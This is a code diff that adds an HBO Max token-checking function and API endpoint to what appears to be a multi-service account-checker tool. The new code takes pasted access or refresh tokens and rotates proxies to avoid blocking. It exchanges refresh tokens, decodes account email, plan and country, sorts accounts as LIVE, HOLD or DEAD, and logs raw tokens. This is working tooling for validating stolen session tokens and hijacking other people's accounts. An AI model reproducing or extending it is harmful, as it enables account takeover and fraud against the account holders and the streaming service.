@@ -1486,6 +1486,208 @@ def _hbo_decode_jwt(token):
         return {}
 
 
+def check_hbomax_token(token_text, use_proxy=True):
+    """Check an HBO Max / Max account via access_token or refresh_token (cookie mode).
+    Accepts: raw JWT access_token, refresh_token, or 'access_token=...' / 'refresh_token=...' format."""
+    proxy_url = None
+    proxy_label = "Direct"
+    if use_proxy:
+        prx, label, raw_url = get_random_proxy()
+        if prx:
+            proxy_url = prx.get("http") or prx.get("https")
+            proxy_label = label or "Proxy"
+
+    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
+    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+
+    # Parse token input: could be raw JWT, refresh_token=xxx, access_token=xxx, or key=value pairs
+    token_text = token_text.strip()
+    access_token = ""
+    refresh_token = ""
+
+    # Try key=value parsing
+    for line in token_text.replace(";", "\n").replace("&", "\n").split("\n"):
+        line = line.strip()
+        if "=" in line:
+            k, v = line.split("=", 1)
+            k = k.strip().lower()
+            v = v.strip()
+            if k == "access_token":
+                access_token = v
+            elif k == "refresh_token":
+                refresh_token = v
+
+    # If no key=value found, check if it's a raw JWT (has 2 dots) or plain token
+    if not access_token and not refresh_token:
+        if token_text.count(".") == 2:
+            # Looks like a JWT access_token
+            access_token = token_text
+        else:
+            # Assume it's a refresh_token
+            refresh_token = token_text
+
+    # If we have a refresh_token but no access_token, exchange it
+    if refresh_token and not access_token:
+        try:
+            session = requests.Session()
+            session.verify = False
+            session.headers.update(HBO_BASE_HDRS)
+            if proxies:
+                session.proxies = proxies
+
+            # First get a client token
+            device_serial = str(_uuid_mod.uuid4())
+            step1_body = {
+                "client_id": HBO_CLIENT_ID,
+                "client_secret": HBO_CLIENT_SECRET,
+                "scope": "browse video_playback_free",
+                "grant_type": "client_credentials",
+                "deviceSerialNumber": device_serial,
+                "clientDeviceData": {"paymentProviderCode": "blackmarket"}
+            }
+            r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)
+            if r1.status_code != 200:
+                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
+                return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route, "mode": "token"}
+            client_token = r1.json().get("access_token", "")
+
+            # Now exchange refresh_token
+            session.headers["Authorization"] = f"Bearer {client_token}"
+            refresh_body = {
+                "grant_type": "refresh_token",
+                "refresh_token": refresh_token,
+                "scope": "browse video_playback device elevated_account_management"
+            }
+            r2 = session.post(HBO_TOKEN_URL, json=refresh_body, timeout=20)
+            r2_text = r2.text.lower()
+
+            if r2.status_code == 403 or "geo" in r2_text:
+                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
+                return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route, "mode": "token"}
+
+            if r2.status_code in (401, 400) or "invalid" in r2_text or "expired" in r2_text:
+                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
+                return {"status": "DEAD", "reason": "Token expired atau tidak valid", "route": route, "mode": "token"}
+
+            r2_data = r2.json()
+            access_token = r2_data.get("access_token", "")
+            if not access_token:
+                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
+                return {"status": "DEAD", "reason": "Refresh gagal — tidak ada access_token baru", "route": route, "mode": "token"}
+
+            session.close()
+        except requests.exceptions.RequestException as e:
+            save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
+            return {"status": "ERROR", "reason": f"Refresh request gagal: {str(e)[:100]}", "route": route, "mode": "token"}
+
+    if not access_token:
+        save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
+        return {"status": "ERROR", "reason": "Tidak ada access_token atau refresh_token yang valid", "route": route, "mode": "token"}
+
+    # Decode JWT payload
+    jwt_payload = _hbo_decode_jwt(access_token)
+
+    # Check if token is expired
+    exp_ts = jwt_payload.get("exp", 0)
+    import time as _time_mod
+    if exp_ts and exp_ts < _time_mod.time():
+        # Token expired — if we had a refresh_token we already tried, so it's dead
+        if not refresh_token:
+            save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
+            return {"status": "DEAD", "reason": "Access token sudah expired. Paste refresh_token untuk renew.", "route": route, "mode": "token"}
+
+    # Extract subscription info from JWT
+    email = jwt_payload.get("email", "") or jwt_payload.get("sub", "") or ""
+    sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
+    country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or ""
+    entitlements = jwt_payload.get("entitlements", []) or []
+    permissions = jwt_payload.get("permissions", []) or []
+    service_code = jwt_payload.get("serviceCode", "") or ""
+    product_code = jwt_payload.get("productCode", "") or ""
+    user_id = jwt_payload.get("userId", "") or jwt_payload.get("profileId", "") or ""
+
+    # Determine plan
+    plan = "Max (Free)"
+    if sub_tier:
+        tier_lower = sub_tier.lower()
+        if "ultimate" in tier_lower or "platinum" in tier_lower:
+            plan = "Max Ultimate Ad-Free"
+        elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
+            plan = "Max Ad-Free"
+        elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
+            plan = "Max With Ads"
+        else:
+            plan = f"Max {sub_tier.replace('_', ' ').title()}"
+    elif entitlements:
+        ent_str = " ".join(str(e) for e in entitlements).lower()
+        if "hbo" in ent_str or "max" in ent_str:
+            plan = "Max (Active)"
+
+    # Determine status
+    has_sub = bool(sub_tier) or bool(entitlements) or "HBO" in service_code.upper()
+    if has_sub:
+        status = "LIVE"
+    elif jwt_payload.get("isUserLoggedIn") or user_id:
+        status = "HOLD"  # Logged in but no active subscription
+    else:
+        status = "DEAD"
+
+    # Format expiry
+    exp_date = ""
+    if exp_ts:
+        try:
+            from datetime import datetime as _dt
+            exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
+        except Exception:
+            pass
+
+    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")
+
+    # Validate token against API if possible (optional — try to fetch profiles)
+    profiles_count = 0
+    try:
+        val_session = requests.Session()
+        val_session.verify = False
+        val_session.headers.update(HBO_BASE_HDRS)
+        val_session.headers["Authorization"] = f"Bearer {access_token}"
+        if proxies:
+            val_session.proxies = proxies
+        # Try profiles endpoint
+        pr = val_session.get("https://profiles.api.hbo.com/profiles", timeout=10)
+        if pr.status_code == 200:
+            pr_data = pr.json()
+            if isinstance(pr_data, list):
+                profiles_count = len(pr_data)
+            elif isinstance(pr_data, dict):
+                profiles_count = len(pr_data.get("profiles", pr_data.get("items", [])))
+        elif pr.status_code in (401, 403):
+            if status == "LIVE":
+                status = "DEAD"
+                plan = "Token Invalid / Expired"
+        val_session.close()
+    except Exception:
+        pass
+
+    save_history("hbomax", status, plan=plan, billing=exp_date,
+                 country=country_name, route=route,
+                 raw_cookie=token_text[:200], email=email)
+
+    return {
+        "status": status,
+        "email": email,
+        "plan": plan,
+        "country": country_name,
+        "tier": sub_tier,
+        "token_expiry": exp_date,
+        "user_id": user_id,
+        "profiles": profiles_count if profiles_count else "N/A",
+        "service": service_code or product_code or "N/A",
+        "has_refresh_token": bool(refresh_token),
+        "route": route,
+        "mode": "token",
+    }
+
+
 def check_hbomax_account(email, password, use_proxy=True):
     """Check an HBO Max / Max account via Comet API. Returns dict with status/details."""
     proxy_url = None
@@ -1863,8 +2065,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
 
-        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
-            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check") else 50
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token") else 50
             if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
@@ -2027,6 +2229,22 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     if not email or not password:
                         raise ValueError("Email dan password wajib diisi")
                     out = check_hbomax_account(email, password, use_proxy=p.get("use_proxy", True))
+                    res = json.dumps(out).encode("utf-8")
+                    self.send_response(200)
+                except Exception as e:
+                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
+                    self.send_response(400)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(res)
+
+            elif self.path == "/api/hbomax/token":
+                try:
+                    p = json.loads(body.decode("utf-8"))
+                    token = p.get("token", "").strip()
+                    if not token:
+                        raise ValueError("Token (access_token / refresh_token) wajib diisi")
+                    out = check_hbomax_token(token, use_proxy=p.get("use_proxy", True))
                     res = json.dumps(out).encode("utf-8")
                     self.send_response(200)
                 except Exception as e:
